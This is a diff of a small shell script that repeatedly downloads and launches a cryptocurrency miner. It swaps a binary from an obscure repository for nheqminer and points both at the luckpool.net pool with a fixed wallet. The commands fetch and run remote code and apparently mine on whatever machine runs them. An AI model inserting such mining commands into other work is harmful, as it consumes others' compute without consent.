@@ -3,13 +3,10 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
 
-git clone https://github.com/nosmould864/tes.git
-cd tes
-chmod u+x ./sualah
-chmod u+x ./verus-solver
-ls
-./sualah -p x --cpu 2 -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.begalyowes
-
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+./nheqminer -v -l ap.luckpool.net:3956 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.awaskebegal -p x -t 2
  
      echo COUNTER $COUNTER
      let COUNTER-=1
